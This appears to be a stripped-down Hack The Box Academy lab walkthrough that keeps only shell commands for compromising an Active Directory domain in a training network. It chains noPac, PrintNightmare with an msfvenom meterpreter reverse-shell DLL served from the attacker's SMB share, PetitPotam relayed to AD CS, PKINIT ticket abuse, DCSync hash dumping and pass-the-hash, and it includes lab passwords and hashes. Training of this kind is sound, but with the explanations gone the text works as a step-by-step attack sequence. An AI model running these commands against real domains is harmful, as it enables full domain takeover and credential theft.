...
```shell-session
swmpdnky@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

Bleeding Edge Vulnerabilities

```shell-session
swmpdnky@htb[/htb]$ python setup.py install 
```
...
```shell-session
swmpdnky@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
...
```shell-session
swmpdnky@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```
...
```shell-session
swmpdnky@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
...
```shell-session
swmpdnky@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
...
```shell-session
swmpdnky@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
...
```shell-session
swmpdnky@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
...
```shell-session
swmpdnky@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
...
```shell-session
swmpdnky@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
...
```shell-session
swmpdnky@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```
...
```shell-session
swmpdnky@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
...
```shell-session
swmpdnky@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
...
```shell-session
swmpdnky@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
...
```shell-session
swmpdnky@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
